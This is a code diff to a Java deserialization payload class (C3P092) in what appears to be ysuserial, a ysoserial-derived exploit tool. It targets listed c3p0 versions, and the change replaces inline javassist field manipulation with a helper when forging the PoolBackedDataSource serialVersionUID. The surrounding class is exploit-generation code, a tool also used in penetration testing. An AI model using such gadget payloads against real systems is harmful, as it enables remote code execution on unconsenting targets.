@@ -3,14 +3,12 @@ package org.su18.ysuserial.payloads;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-import javassist.CtField;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.SuClassLoader;
 
 import javax.naming.NamingException;
-
 import javax.naming.Reference;
 import javax.naming.Referenceable;
 import javax.sql.ConnectionPoolDataSource;
@@ -19,6 +17,8 @@ import java.io.PrintWriter;
 import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
+
+import static org.su18.ysuserial.payloads.util.Gadgets.insertField;
 
 @Dependencies({"com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8", "com.mchange:mchange-commons-java:0.2.11"})
 @Authors({Authors.MBECHLER})
@@ -39,12 +39,7 @@ public class C3P092 implements ObjectPayload<Object> {
 		pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
 		final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");
 
-		try {
-			CtField ctSUID = ctPoolBackedDataSource.getDeclaredField("serialVersionUID");
-			ctPoolBackedDataSource.removeField(ctSUID);
-		} catch (javassist.NotFoundException e) {
-		}
-		ctPoolBackedDataSource.addField(CtField.make("private static final long serialVersionUID = 7387108436934414104L;", ctPoolBackedDataSource));
+		insertField(ctPoolBackedDataSource, "serialVersionUID", "private static final long serialVersionUID = 7387108436934414104L;");
 
 		// mock method name until armed
 		final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());
